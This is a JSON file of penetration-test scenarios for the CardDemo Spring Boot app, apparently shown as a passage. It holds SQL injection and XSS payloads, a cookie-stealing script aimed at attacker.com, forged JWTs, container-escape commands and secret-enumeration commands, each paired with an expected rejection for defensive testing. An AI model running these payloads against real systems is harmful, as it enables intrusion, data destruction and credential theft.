{
  "metadata": {
    "description": "Comprehensive penetration testing scenarios for CardDemo Spring Boot microservices security validation",
    "version": "1.0.0",
    "created_date": "2024-07-27",
    "compliance_frameworks": [
      "PCI DSS 3.2.1",
      "SOX Section 404",
      "GDPR Article 32"
    ],
    "target_architecture": "Spring Boot 3.2.x microservices with PostgreSQL 15+ and Redis 7+",
    "security_framework": "Spring Security 6.x with JWT authentication",
    "testing_methodology": "OWASP ASVS 4.0 and OWASP Top 10 2021"
  },

  "PenetrationTestScenarios": {
    "description": "Primary penetration testing scenarios providing comprehensive security validation through simulated attacks and vulnerability exploitation attempts",
    
    "sql_injection_attack_scenarios": {
      "description": "SQL injection vulnerability testing against Spring Data JPA repositories and PostgreSQL database",
      "test_framework": "OWASP ZAP 2.16.1 with custom payload generation",
      "target_components": ["AuthenticationService", "SecurityConfig", "JPA repositories"],
      
      "basic_sql_injection_tests": [
        {
          "test_name": "Authentication Bypass via SQL Injection",
          "target_endpoint": "/api/auth/login",
          "http_method": "POST",
          "vulnerability_type": "SQL_INJECTION_AUTHENTICATION_BYPASS",
          "test_payloads": [
            {
              "username": "admin' OR '1'='1' --",
              "password": "password",
              "expected_response": 401,
              "expected_behavior": "Spring Security validation blocks malicious input before database interaction"
            },
            {
              "username": "'; DROP TABLE users; --",
              "password": "password123",
              "expected_response": 400,
              "expected_behavior": "JSR-303 validation prevents SQL injection through input sanitization"
            },
            {
              "username": "admin' UNION SELECT username, password FROM users WHERE username='admin' --",
              "password": "test",
              "expected_response": 401,
              "expected_behavior": "Parameterized queries prevent union-based SQL injection"
            }
          ],
          "security_controls_tested": [
            "Input validation through @Valid annotations",
            "Parameterized JPA queries prevent SQL injection",
            "Spring Security authentication filter validation"
          ]
        },
        {
          "test_name": "Account View SQL Injection via Path Parameters",
          "target_endpoint": "/api/account/view/{accountId}",
          "http_method": "GET",
          "vulnerability_type": "SQL_INJECTION_PATH_PARAMETER",
          "authentication_required": true,
          "test_payloads": [
            {
              "account_id": "123456789' OR '1'='1",
              "authorization_header": "Bearer {{valid_jwt_token}}",
              "expected_response": 400,
              "expected_behavior": "Path variable validation prevents SQL injection in repository queries"
            },
            {
              "account_id": "0'; WAITFOR DELAY '00:00:05' --",
              "authorization_header": "Bearer {{valid_jwt_token}}",
              "expected_response": 400,
              "expected_behavior": "Time-based SQL injection blocked by input validation"
            },
            {
              "account_id": "999999999999999999999",
              "authorization_header": "Bearer {{valid_jwt_token}}",
              "expected_response": 404,
              "expected_behavior": "BigInteger overflow handling prevents database errors"
            }
          ],
          "security_controls_tested": [
            "@PathVariable validation with custom constraints",
            "JPA repository method parameter validation",
            "Database transaction isolation level protection"
          ]
        }
      ],

      "blind_sql_injection_tests": [
        {
          "test_name": "User Management Blind SQL Injection",
          "target_endpoint": "/api/users/{userId}",
          "http_method": "GET",
          "vulnerability_type": "BLIND_SQL_INJECTION",
          "authentication_required": true,
          "required_role": "ROLE_ADMIN",
          "test_payloads": [
            {
              "user_id": "ADMIN' AND (SELECT COUNT(*) FROM users WHERE username='admin') = 1 --",
              "authorization_header": "Bearer {{admin_jwt_token}}",
              "expected_response": 400,
              "expected_behavior": "Spring Data JPA query validation prevents blind SQL injection attempts"
            },
            {
              "user_id": "TEST' AND (SELECT SUBSTRING(version(), 1, 1)) = '1",
              "authorization_header": "Bearer {{admin_jwt_token}}",
              "expected_response": 400,
              "expected_behavior": "Database version information disclosure prevented by validation"
            }
          ],
          "security_controls_tested": [
            "Role-based access control via @PreAuthorize",
            "Named parameter queries in custom repository methods",
            "PostgreSQL prepared statement protection"
          ]
        }
      ],

      "stored_procedure_injection_tests": [
        {
          "test_name": "Transaction Processing SQL Injection",
          "target_endpoint": "/api/transaction/add",
          "http_method": "POST",
          "vulnerability_type": "SQL_INJECTION_JSON_PAYLOAD",
          "authentication_required": true,
          "test_payloads": [
            {
              "request_body": {
                "accountId": "123456789'; DELETE FROM transactions; --",
                "amount": "100.00",
                "transactionType": "DEBIT"
              },
              "authorization_header": "Bearer {{valid_jwt_token}}",
              "expected_response": 400,
              "expected_behavior": "JSON validation and BigDecimal parsing prevents SQL injection"
            },
            {
              "request_body": {
                "accountId": "123456789",
                "amount": "100.00' OR '1'='1",
                "transactionType": "CREDIT"
              },
              "authorization_header": "Bearer {{valid_jwt_token}}",
              "expected_response": 400,
              "expected_behavior": "BigDecimal type conversion blocks string-based SQL injection"
            }
          ],
          "security_controls_tested": [
            "@Transactional annotation ensures transaction integrity",
            "BigDecimal validation prevents numeric SQL injection",
            "Spring MVC JSON deserialization with type safety"
          ]
        }
      ]
    },

    "xss_vulnerability_testing": {
      "description": "Cross-Site Scripting (XSS) vulnerability assessment for React frontend and API responses",
      "test_framework": "OWASP ZAP XSS scanning with custom payload validation",
      "target_components": ["React frontend", "REST API responses", "Error handling"],

      "reflected_xss_tests": [
        {
          "test_name": "Authentication Error Message XSS",
          "target_endpoint": "/api/auth/login",
          "http_method": "POST",
          "vulnerability_type": "REFLECTED_XSS",
          "test_payloads": [
            {
              "username": "<script>alert('XSS')</script>",
              "password": "password",
              "expected_response": 401,
              "expected_behavior": "Error messages are properly encoded and do not execute JavaScript"
            },
            {
              "username": "<img src=x onerror=alert('XSS')>",
              "password": "test",
              "expected_response": 401,
              "expected_behavior": "HTML entities are escaped in JSON error responses"
            },
            {
              "username": "javascript:alert('XSS')",
              "password": "test",
              "expected_response": 401,
              "expected_behavior": "JavaScript protocol handlers are neutralized"
            }
          ],
          "security_controls_tested": [
            "JSON response encoding prevents XSS in error messages",
            "Spring MVC input validation with HTML escaping",
            "Content-Security-Policy headers block inline scripts"
          ]
        },
        {
          "test_name": "Account Data XSS via API Response",
          "target_endpoint": "/api/account/view/{accountId}",
          "http_method": "GET",
          "vulnerability_type": "REFLECTED_XSS_API_RESPONSE",
          "authentication_required": true,
          "test_payloads": [
            {
              "account_id": "123456789",
              "authorization_header": "Bearer {{valid_jwt_token}}",
              "manipulated_data": {
                "account_name": "<svg onload=alert('XSS')>",
                "account_description": "<iframe src=javascript:alert('XSS')></iframe>"
              },
              "expected_response": 200,
              "expected_behavior": "Account data is JSON-encoded and HTML-escaped in responses"
            }
          ],
          "security_controls_tested": [
            "Jackson JSON serialization with HTML escaping",
            "Spring Security content type validation",
            "React frontend XSS protection via dangerouslySetInnerHTML avoidance"
          ]
        }
      ],

      "stored_xss_tests": [
        {
          "test_name": "User Profile Stored XSS",
          "target_endpoint": "/api/users",
          "http_method": "POST",
          "vulnerability_type": "STORED_XSS",
          "authentication_required": true,
          "required_role": "ROLE_ADMIN",
          "test_payloads": [
            {
              "request_body": {
                "userId": "TESTXSS",
                "firstName": "<script>document.location='http://attacker.com/'+document.cookie</script>",
                "lastName": "User",
                "password": "Password123",
                "userType": "U"
              },
              "authorization_header": "Bearer {{admin_jwt_token}}",
              "expected_response": 201,
              "verification_endpoint": "/api/users/TESTXSS",
              "expected_behavior": "Stored XSS payload is neutralized through database encoding and output escaping"
            }
          ],
          "security_controls_tested": [
            "PostgreSQL text column storage prevents script execution",
            "JPA entity validation with @Pattern annotations",
            "REST controller output encoding for JSON responses"
          ]
        }
      ],

      "dom_xss_tests": [
        {
          "test_name": "React Component DOM XSS",
          "target_component": "LoginComponent",
          "vulnerability_type": "DOM_XSS",
          "test_scenarios": [
            {
              "test_case": "URL fragment XSS",
              "test_url": "http://localhost:3000/login#<script>alert('XSS')</script>",
              "expected_behavior": "React Router does not render URL fragments as HTML"
            },
            {
              "test_case": "LocalStorage XSS",
              "storage_manipulation": {
                "key": "jwt_token",
                "value": "<img src=x onerror=alert('XSS')>"
              },
              "expected_behavior": "JWT validation prevents malicious token processing"
            }
          ],
          "security_controls_tested": [
            "React XSS protection through JSX automatic escaping",
            "Content Security Policy prevents inline script execution",
            "JWT signature validation prevents token manipulation"
          ]
        }
      ]
    },

    "csrf_attack_simulation": {
      "description": "Cross-Site Request Forgery (CSRF) attack simulation testing CSRF protection mechanisms",
      "test_framework": "Custom CSRF attack simulation with CsrfSecurityConfig validation",
      "target_components": ["CsrfSecurityConfig", "React frontend", "State-changing endpoints"],

      "csrf_token_validation_tests": [
        {
          "test_name": "Missing CSRF Token Attack",
          "target_endpoint": "/api/users",
          "http_method": "POST",
          "vulnerability_type": "CSRF_MISSING_TOKEN",
          "authentication_required": true,
          "test_scenarios": [
            {
              "request_headers": {
                "Authorization": "Bearer {{admin_jwt_token}}",
                "Content-Type": "application/json"
              },
              "request_body": {
                "userId": "MALICIOUS",
                "password": "password123",
                "userType": "A"
              },
              "csrf_token_included": false,
              "expected_response": 403,
              "expected_behavior": "CsrfSecurityConfig blocks requests without valid CSRF token"
            }
          ],
          "security_controls_tested": [
            "CookieCsrfTokenRepository validates double-submit cookie pattern",
            "XorCsrfTokenRequestAttributeHandler provides additional token protection",
            "Custom CsrfHeaderFilter enforces header-based CSRF validation"
          ]
        },
        {
          "test_name": "Invalid CSRF Token Attack",
          "target_endpoint": "/api/accounts/{accountId}",
          "http_method": "PUT",
          "vulnerability_type": "CSRF_INVALID_TOKEN",
          "authentication_required": true,
          "test_scenarios": [
            {
              "path_parameters": {
                "accountId": "123456789"
              },
              "request_headers": {
                "Authorization": "Bearer {{valid_jwt_token}}",
                "Content-Type": "application/json",
                "X-XSRF-TOKEN": "invalid_csrf_token_value"
              },
              "request_body": {
                "accountBalance": "999999.99"
              },
              "csrf_cookie": "XSRF-TOKEN=different_csrf_token_value",
              "expected_response": 403,
              "expected_behavior": "Double-submit cookie validation detects token mismatch"
            }
          ],
          "security_controls_tested": [
            "CSRF token header and cookie comparison validation",
            "Token mismatch logging for security monitoring",
            "Structured JSON error response for React frontend"
          ]
        }
      ],

      "csrf_bypass_attempts": [
        {
          "test_name": "Content-Type CSRF Bypass Attempt",
          "target_endpoint": "/api/transaction/add",
          "http_method": "POST",
          "vulnerability_type": "CSRF_CONTENT_TYPE_BYPASS",
          "test_scenarios": [
            {
              "request_headers": {
                "Authorization": "Bearer {{valid_jwt_token}}",
                "Content-Type": "text/plain"
              },
              "request_body": "{\"accountId\": \"123456789\", \"amount\": \"1000000.00\", \"transactionType\": \"CREDIT\"}",
              "expected_response": 403,
              "expected_behavior": "Content-Type validation prevents CSRF bypass through alternative content types"
            },
            {
              "request_headers": {
                "Authorization": "Bearer {{valid_jwt_token}}",
                "Content-Type": "application/x-www-form-urlencoded"
              },
              "request_body": "accountId=123456789&amount=1000000.00&transactionType=CREDIT",
              "expected_response": 403,
              "expected_behavior": "CSRF protection applies to all state-changing content types"
            }
          ],
          "security_controls_tested": [
            "Content-Type specific CSRF validation",
            "Request method filtering for CSRF enforcement",
            "Origin header validation for cross-origin request detection"
          ]
        }
      ],

      "csrf_protection_exclusion_tests": [
        {
          "test_name": "JWT API Endpoint CSRF Exclusion",
          "description": "Verify that stateless JWT API endpoints are properly excluded from CSRF protection",
          "test_scenarios": [
            {
              "target_endpoint": "/api/auth/login",
              "http_method": "POST",
              "request_headers": {
                "Content-Type": "application/json"
              },
              "request_body": {
                "username": "testuser",
                "password": "password123"
              },
              "csrf_token_included": false,
              "expected_response": 401,
              "expected_behavior": "Authentication endpoints excluded from CSRF protection per configuration"
            },
            {
              "target_endpoint": "/actuator/health",
              "http_method": "GET",
              "csrf_token_included": false,
              "expected_response": 200,
              "expected_behavior": "Actuator endpoints excluded from CSRF protection for monitoring"
            }
          ],
          "security_controls_tested": [
            "CSRF ignored paths configuration validation",
            "Stateless vs stateful endpoint differentiation",
            "Selective CSRF enforcement based on request patterns"
          ]
        }
      ]
    },

    "authentication_bypass_attempts": {
      "description": "Authentication bypass testing through JWT token manipulation and session hijacking scenarios",
      "test_framework": "Custom JWT manipulation with Spring Security validation testing",
      "target_components": ["AuthenticationService", "JwtAuthenticationFilter", "SecurityConfig"],

      "jwt_token_manipulation_tests": [
        {
          "test_name": "JWT Algorithm Confusion Attack",
          "vulnerability_type": "JWT_ALGORITHM_CONFUSION", 
          "test_scenarios": [
            {
              "attack_description": "Change HS256 to RS256 to bypass signature validation",
              "manipulated_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJNQUxJQ0lPVVMiLCJ1c2VyVHlwZSI6IkEiLCJyb2xlIjoiUk9MRV9BRE1JTiIsInNlc3Npb25JZCI6IkhBQ0tFRF9TRVNTSU9OIiwiZmlyc3ROYW1lIjoiTWFsaWNpb3VzIiwibGFzdE5hbWUiOiJBdHRhY2tlciIsImlzcyI6IkNhcmREZW1vLUF1dGgtU2VydmljZSIsImlhdCI6MTcyMjEwNDQwMCwiZXhwIjoxNzIyMTA2MjAwfQ.FAKE_RSA_SIGNATURE_FOR_ALGORITHM_CONFUSION",
              "target_endpoints": ["/api/users", "/api/account/view/123456789"],
              "expected_response": 401,
              "expected_behavior": "JwtDecoder enforces HS256 algorithm and rejects algorithm confusion attempts"
            }
          ],
          "security_controls_tested": [
            "Nimbus JWT decoder algorithm enforcement",
            "JWT signature validation with fixed algorithm",
            "Spring Security JWT authentication filter validation"
          ]
        },
        {
          "test_name": "JWT Signature Bypass Attempt",
          "vulnerability_type": "JWT_SIGNATURE_BYPASS",
          "test_scenarios": [
            {
              "attack_description": "Remove signature from JWT token",
              "manipulated_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJNQUxJQ0lPVVMiLCJ1c2VyVHlwZSI6IkEiLCJyb2xlIjoiUk9MRV9BRE1JTiJ9.",
              "target_endpoints": ["/api/users", "/api/admin/settings"],
              "expected_response": 401,
              "expected_behavior": "JWT validation requires valid signature and rejects unsigned tokens"
            },
            {
              "attack_description": "Modify claims and resign with known weak key",
              "manipulated_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInVzZXJUeXBlIjoiQSIsInJvbGUiOiJST0xFX0FETUlOIiwic2Vzc2lvbklkIjoiRkFLRV9TRVNTSU9OIiwiZmlyc3ROYW1lIjoiRmFrZSIsImxhc3ROYW1lIjoiQWRtaW4iLCJpc3MiOiJDYXJkRGVtby1BdXRoLVNlcnZpY2UiLCJpYXQiOjE3MjIxMDQ0MDAsImV4cCI6MTc0MjEwNjIwMH0.WEAK_KEY_SIGNATURE_ATTEMPT",
              "target_endpoints": ["/api/users"],
              "expected_response": 401,
              "expected_behavior": "JWT secret key strength (minimum 32 bytes) prevents weak key attacks"
            }
          ],
          "security_controls_tested": [
            "JWT secret key minimum length validation (32 bytes)",
            "Signature verification with secure HMAC-SHA256",
            "Token expiration validation prevents long-lived malicious tokens"
          ]
        },
        {
          "test_name": "JWT Claims Manipulation",
          "vulnerability_type": "JWT_CLAIMS_MANIPULATION",
          "test_scenarios": [
            {
              "attack_description": "Elevate user role from USER to ADMIN",
              "base_token": "{{valid_user_token}}",
              "claim_modifications": {
                "role": "ROLE_ADMIN",
                "userType": "A"
              },
              "target_endpoints": ["/api/users", "/api/users/TESTUSER"],
              "expected_response": 401,
              "expected_behavior": "JWT signature validation prevents claims modification without key knowledge"
            },
            {
              "attack_description": "Extend token expiration",
              "base_token": "{{valid_user_token}}",
              "claim_modifications": {
                "exp": 9999999999
              },
              "target_endpoints": ["/api/account/view/123456789"],
              "expected_response": 401,
              "expected_behavior": "Signature validation prevents expiration extension attacks"
            }
          ],
          "security_controls_tested": [
            "JWT claims integrity through signature validation",
            "Role-based access control enforcement via @PreAuthorize",
            "Token expiration validation in JwtAuthenticationFilter"
          ]
        }
      ],

      "session_hijacking_scenarios": [
        {
          "test_name": "JWT Token Theft and Replay",
          "vulnerability_type": "SESSION_HIJACKING_JWT_REPLAY",
          "test_scenarios": [
            {
              "attack_description": "Replay valid JWT token from different IP address",
              "stolen_token": "{{valid_admin_token}}",
              "source_ip_simulation": "192.168.1.100",
              "target_endpoints": ["/api/users", "/api/users/ADMIN"],
              "expected_response": 200,
              "expected_behavior": "JWT tokens are stateless and IP-independent by design - additional controls needed"
            },
            {
              "attack_description": "Use expired JWT token",
              "expired_token": "{{expired_token_from_config}}",
              "target_endpoints": ["/api/account/view/123456789"],
              "expected_response": 401,
              "expected_behavior": "JWT expiration validation prevents expired token usage"
            }
          ],
          "security_controls_tested": [
            "JWT expiration time enforcement (30 minutes default)",
            "Stateless token validation without IP binding",
            "Token blacklisting capability through Redis session store"
          ]
        },
        {
          "test_name": "Session Fixation Attack",
          "vulnerability_type": "SESSION_FIXATION",
          "test_scenarios": [
            {
              "attack_description": "Attempt to fix session ID before authentication",
              "pre_auth_session_id": "FIXED_SESSION_ID_123",
              "target_endpoint": "/api/auth/login",
              "credentials": {
                "username": "testuser",
                "password": "password123"
              },
              "expected_behavior": "JWT authentication generates new session ID, preventing fixation"
            }
          ],
          "security_controls_tested": [
            "JWT sessionId claim uniqueness per authentication",
            "Spring Session Redis integration for session management",
            "Session regeneration on successful authentication"
          ]
        }
      ],

      "authorization_boundary_testing": [
        {
          "test_name": "Horizontal Privilege Escalation",
          "vulnerability_type": "HORIZONTAL_PRIVILEGE_ESCALATION",
          "test_scenarios": [
            {
              "attack_description": "User accessing another user's account data",
              "attacker_token": "{{valid_user_token}}",
              "target_endpoint": "/api/account/view/{accountId}",
              "target_account_ids": ["999999999", "000000001", "123456788"],
              "expected_response": 403,
              "expected_behavior": "Authorization logic prevents access to other users' accounts"
            }
          ],
          "security_controls_tested": [
            "Account ownership validation in service layer",
            "JWT sub claim verification against requested resources",
            "Database-level row security policies"
          ]
        },
        {
          "test_name": "Vertical Privilege Escalation",
          "vulnerability_type": "VERTICAL_PRIVILEGE_ESCALATION",
          "test_scenarios": [
            {
              "attack_description": "Regular user accessing admin-only endpoints",
              "user_token": "{{valid_user_token}}",
              "admin_endpoints": [
                "/api/users",
                "/api/users/ADMIN",
                "/api/admin/settings"
              ],
              "expected_response": 403,
              "expected_behavior": "@PreAuthorize('hasRole('ADMIN')') prevents unauthorized access"
            }
          ],
          "security_controls_tested": [
            "Method-level security with @PreAuthorize annotations",
            "Role hierarchy enforcement in Spring Security",
            "JWT role claims validation in authentication filter"
          ]
        }
      ]
    },

    "container_security_validation": {
      "description": "Container security testing for Docker images and Kubernetes deployment protection",
      "test_framework": "Container security scanning with vulnerability assessment",
      "target_components": ["Docker images", "Kubernetes manifests", "Container runtime"],

      "docker_image_security_tests": [
        {
          "test_name": "Base Image Vulnerability Scan",
          "vulnerability_type": "CONTAINER_IMAGE_VULNERABILITIES",
          "target_images": [
            "openjdk:21",
            "postgres:15",
            "redis:7"
          ],
          "test_scenarios": [
            {
              "scan_type": "CVE_DATABASE_CHECK",
              "vulnerability_databases": ["NVD", "OSS Index", "Snyk"],
              "severity_threshold": "HIGH",
              "expected_behavior": "No HIGH or CRITICAL vulnerabilities in base images"
            },
            {
              "scan_type": "MALWARE_DETECTION",
              "scanning_tools": ["ClamAV", "YARA rules"],
              "expected_behavior": "No malware detected in container layers"
            }
          ],
          "security_controls_tested": [
            "Container image vulnerability scanning in CI/CD pipeline",
            "Base image security baseline enforcement",
            "Image layer analysis for security threats"
          ]
        },
        {
          "test_name": "Container Runtime Security",
          "vulnerability_type": "CONTAINER_RUNTIME_SECURITY",
          "test_scenarios": [
            {
              "attack_description": "Container escape attempt",
              "test_commands": [
                "docker run --privileged --pid=host",
                "nsenter -t 1 -m -u -n -i sh"
              ],
              "expected_behavior": "Kubernetes security policies prevent privileged container execution"
            },
            {
              "attack_description": "Host file system access",
              "volume_mount_tests": [
                "/:/host",
                "/var/run/docker.sock:/var/run/docker.sock"
              ],
              "expected_behavior": "Pod Security Standards prevent dangerous volume mounts"
            }
          ],
          "security_controls_tested": [
            "Kubernetes Pod Security Standards enforcement",
            "Container runtime security policies",
            "Host resource isolation validation"
          ]
        }
      ],

      "kubernetes_security_tests": [
        {
          "test_name": "RBAC Permission Validation",
          "vulnerability_type": "KUBERNETES_RBAC_MISCONFIGURATION",
          "test_scenarios": [
            {
              "attack_description": "Privilege escalation through over-permissive RBAC",
              "test_service_accounts": [
                "carddemo-auth-service",
                "carddemo-account-service",
                "carddemo-transaction-service"
              ],
              "forbidden_permissions": [
                "cluster-admin",
                "nodes/get",
                "secrets/create"
              ],
              "expected_behavior": "Service accounts have minimal required permissions only"
            },
            {
              "attack_description": "Cross-namespace access attempt",
              "source_namespace": "carddemo-prod",
              "target_namespace": "kube-system",
              "expected_behavior": "RBAC prevents cross-namespace unauthorized access"
            }
          ],
          "security_controls_tested": [
            "Kubernetes RBAC policy enforcement",
            "Service account permission minimization",
            "Namespace isolation validation"
          ]
        },
        {
          "test_name": "Network Policy Enforcement",
          "vulnerability_type": "KUBERNETES_NETWORK_POLICY",
          "test_scenarios": [
            {
              "attack_description": "Unauthorized pod-to-pod communication",
              "source_pod": "carddemo-frontend",
              "target_pod": "carddemo-database",
              "expected_behavior": "Network policies prevent direct frontend-to-database communication"
            },
            {
              "attack_description": "External network access restriction",
              "source_pod": "carddemo-auth-service",
              "target_destinations": [
                "malicious-external-site.com:443",
                "0.0.0.0:22"
              ],
              "expected_behavior": "Egress network policies restrict unauthorized external access"
            }
          ],
          "security_controls_tested": [
            "Kubernetes Network Policy enforcement",
            "Pod-to-pod communication restrictions",
            "Egress traffic filtering validation"
          ]
        }
      ],

      "secrets_management_tests": [
        {
          "test_name": "Kubernetes Secrets Protection",
          "vulnerability_type": "SECRETS_EXPOSURE",
          "test_scenarios": [
            {
              "attack_description": "Secret enumeration attempt",
              "target_secrets": [
                "carddemo-jwt-secret",
                "carddemo-db-credentials",
                "carddemo-redis-password"
              ],
              "unauthorized_access_attempts": [
                "kubectl get secrets --all-namespaces",
                "kubectl describe secret carddemo-jwt-secret"
              ],
              "expected_behavior": "RBAC prevents unauthorized secret access"
            },
            {
              "attack_description": "Secret extraction from container",
              "container_inspection": [
                "docker inspect carddemo-auth-service",
                "env | grep -i secret"
              ],
              "expected_behavior": "Secrets are mounted as files, not environment variables"
            }
          ],
          "security_controls_tested": [
            "Kubernetes Secrets RBAC protection",
            "Secret mounting as files vs environment variables",
            "Secret encryption at rest validation"
          ]
        }
      ]
    },

    "kubernetes_rbac_testing": {
      "description": "Kubernetes Role-Based Access Control (RBAC) security validation and privilege escalation testing",
      "test_framework": "Kubernetes RBAC policy testing with kubectl security validation",
      "target_components": ["Kubernetes RBAC policies", "Service accounts", "ClusterRoles"],

      "rbac_policy_validation": [
        {
          "test_name": "Service Account Permission Audit",
          "vulnerability_type": "RBAC_OVER_PRIVILEGE",
          "service_accounts_tested": [
            {
              "name": "carddemo-auth-service-sa",
              "namespace": "carddemo-prod",
              "required_permissions": [
                "secrets/get",
                "configmaps/get"
              ],
              "forbidden_permissions": [
                "secrets/create",
                "secrets/delete",
                "nodes/get",
                "pods/exec"
              ],
              "expected_behavior": "Service account has minimal required permissions only"
            },
            {
              "name": "carddemo-database-sa",
              "namespace": "carddemo-prod", 
              "required_permissions": [
                "persistentvolumes/get",
                "persistentvolumeclaims/get"
              ],
              "forbidden_permissions": [
                "cluster-admin",
                "nodes/delete",
                "secrets/list"
              ],
              "expected_behavior": "Database service account limited to storage permissions"
            }
          ],
          "security_controls_tested": [
            "Principle of least privilege enforcement",
            "Service account permission auditing",
            "RBAC policy compliance validation"
          ]
        },
        {
          "test_name": "Cross-Namespace Access Control",
          "vulnerability_type": "RBAC_NAMESPACE_BYPASS",
          "test_scenarios": [
            {
              "attack_description": "Access kube-system namespace from application namespace",
              "source_service_account": "carddemo-auth-service-sa",
              "source_namespace": "carddemo-prod",
              "target_namespace": "kube-system",
              "attempted_actions": [
                "secrets/list",
                "pods/get",
                "configmaps/get"
              ],
              "expected_response": "Forbidden (403)",
              "expected_behavior": "RBAC prevents cross-namespace unauthorized access"
            },
            {
              "attack_description": "Default service account privilege escalation",
              "source_service_account": "default",
              "source_namespace": "carddemo-prod",
              "attempted_actions": [
                "clusterroles/get",
                "clusterrolebindings/create"
              ],
              "expected_response": "Forbidden (403)",
              "expected_behavior": "Default service account has no elevated permissions"
            }
          ],
          "security_controls_tested": [
            "Namespace-based access control enforcement",
            "ClusterRole vs Role permission separation",
            "Default service account security hardening"
          ]
        }
      ],

      "privilege_escalation_tests": [
        {
          "test_name": "Horizontal Privilege Escalation in RBAC",
          "vulnerability_type": "RBAC_HORIZONTAL_ESCALATION",
          "test_scenarios": [
            {
              "attack_description": "Service account accessing other service account resources",
              "attacker_sa": "carddemo-frontend-sa",
              "target_sa": "carddemo-database-sa",
              "attempted_access": [
                "secrets owned by database service account",
                "configmaps owned by database service account"
              ],
              "expected_behavior": "RBAC prevents access to other service account resources"
            }
          ],
          "security_controls_tested": [
            "Resource ownership validation in RBAC",
            "Service account isolation enforcement",
            "Resource-based access control"
          ]
        },
        {
          "test_name": "Vertical Privilege Escalation in RBAC",
          "vulnerability_type": "RBAC_VERTICAL_ESCALATION",
          "test_scenarios": [
            {
              "attack_description": "Application service account gaining cluster-admin privileges",
              "source_sa": "carddemo-auth-service-sa",
              "escalation_attempts": [
                "Create ClusterRoleBinding to cluster-admin",
                "Bind to existing high-privilege ClusterRole",
                "Create custom ClusterRole with elevated permissions"
              ],
              "expected_response": "Forbidden (403)",
              "expected_behavior": "RBAC prevents privilege escalation to cluster administration"
            }
          ],
          "security_controls_tested": [
            "ClusterRoleBinding creation restrictions",
            "Privilege escalation prevention in RBAC",
            "Administrative action auditing"
          ]
        }
      ],

      "rbac_bypass_attempts": [
        {
          "test_name": "RBAC Policy Bypass Through API Versions",
          "vulnerability_type": "RBAC_API_VERSION_BYPASS",
          "test_scenarios": [
            {
              "attack_description": "Use different API versions to bypass RBAC rules",
              "rbac_rule_api_version": "v1",
              "bypass_attempts": [
                "apps/v1",
                "extensions/v1beta1",
                "batch/v1"
              ],
              "target_resources": ["deployments", "secrets", "configmaps"],
              "expected_behavior": "RBAC rules apply consistently across API versions"
            }
          ],
          "security_controls_tested": [
            "API version consistency in RBAC rules",
            "Comprehensive resource coverage in policies",
            "API group security validation"
          ]
        }
      ]
    }
  },

  "SecurityTestConfiguration": {
    "description": "Security testing configuration providing OWASP ZAP integration, vulnerability assessment profiles, and automated penetration test execution",
    
    "owasp_zap_integration_settings": {
      "zap_version": "2.16.1",
      "zap_client_configuration": {
        "api_key": "{{zap_api_key}}",
        "proxy_host": "localhost",
        "proxy_port": 8090,
        "target_url": "http://localhost:8080",
        "context_name": "carddemo-penetration-testing",
        "session_management": {
          "type": "jwt_session_management",
          "jwt_header": "Authorization",
          "jwt_prefix": "Bearer "
        }
      },
      "scan_policies": {
        "baseline_scan": {
          "enabled": true,
          "scan_duration": "30m",
          "scan_strength": "MEDIUM"
        },
        "full_scan": {
          "enabled": true,
          "scan_duration": "120m", 
          "scan_strength": "HIGH"
        },
        "api_scan": {
          "enabled": true,
          "openapi_spec": "/api/v3/api-docs",
          "scan_duration": "60m"
        }
      }
    },

    "vulnerability_assessment_profiles": {
      "owasp_top_10_2021": {
        "enabled": true,
        "categories": [
          "A01_Broken_Access_Control",
          "A02_Cryptographic_Failures", 
          "A03_Injection",
          "A04_Insecure_Design",
          "A05_Security_Misconfiguration",
          "A06_Vulnerable_Components",
          "A07_Identity_Authentication_Failures",
          "A08_Software_Data_Integrity_Failures",
          "A09_Security_Logging_Monitoring_Failures",
          "A10_Server_Side_Request_Forgery"
        ]
      },
      "pci_dss_compliance": {
        "enabled": true,
        "requirements": [
          "Requirement_3_Cardholder_Data_Protection",
          "Requirement_4_Transmission_Security",
          "Requirement_7_Access_Control",
          "Requirement_8_Authentication",
          "Requirement_10_Logging"
        ]
      },
      "financial_services_security": {
        "enabled": true,
        "focus_areas": [
          "transaction_integrity",
          "financial_calculation_accuracy",
          "audit_trail_completeness",
          "data_privacy_protection"
        ]
      }
    },

    "attack_vector_definitions": {
      "injection_attacks": [
        "SQL injection via path parameters",
        "SQL injection via JSON payloads",
        "NoSQL injection attempts",
        "LDAP injection testing",
        "Command injection through file uploads"
      ],
      "authentication_attacks": [
        "JWT token manipulation",
        "Session hijacking attempts",
        "Brute force authentication",
        "Credential stuffing attacks",
        "OAuth flow manipulation"
      ],
      "authorization_attacks": [
        "Horizontal privilege escalation",
        "Vertical privilege escalation", 
        "RBAC policy bypass",
        "API endpoint authorization bypass",
        "Resource access control bypass"
      ],
      "data_validation_attacks": [
        "Input validation bypass",
        "Business logic exploitation",
        "Race condition exploitation",
        "Integer overflow attacks",
        "Buffer overflow attempts"
      ]
    },

    "security_control_validation": {
      "spring_security_controls": [
        {
          "control_name": "JWT Authentication Filter",
          "validation_tests": [
            "Token signature validation",
            "Token expiration enforcement",
            "Claims validation accuracy",
            "Algorithm confusion prevention"
          ]
        },
        {
          "control_name": "CSRF Protection",
          "validation_tests": [
            "Double-submit cookie validation",
            "CSRF token header enforcement",
            "Token synchronization verification",
            "Same-origin policy enforcement"
          ]
        },
        {
          "control_name": "Method-Level Security",
          "validation_tests": [
            "@PreAuthorize annotation enforcement",
            "Role hierarchy validation",
            "Permission-based access control",
            "Expression-based security rules"
          ]
        }
      ],
      "infrastructure_controls": [
        {
          "control_name": "Container Security",
          "validation_tests": [
            "Image vulnerability scanning",
            "Runtime security policy enforcement",
            "Resource isolation validation",
            "Secrets management verification"
          ]
        },
        {
          "control_name": "Network Security",
          "validation_tests": [
            "Network policy enforcement",
            "TLS configuration validation",
            "Port access restrictions",
            "Service mesh security"
          ]
        }
      ]
    },

    "compliance_testing_scenarios": {
      "pci_dss_scenarios": [
        {
          "requirement": "3.4 - Cardholder data unreadable",
          "test_scenarios": [
            "Card number encryption verification",
            "Database field encryption validation",
            "PII masking in logs verification"
          ]
        },
        {
          "requirement": "8.2 - Strong authentication",
          "test_scenarios": [
            "Password complexity enforcement",
            "Multi-factor authentication readiness",
            "Account lockout policy validation"
          ]
        }
      ],
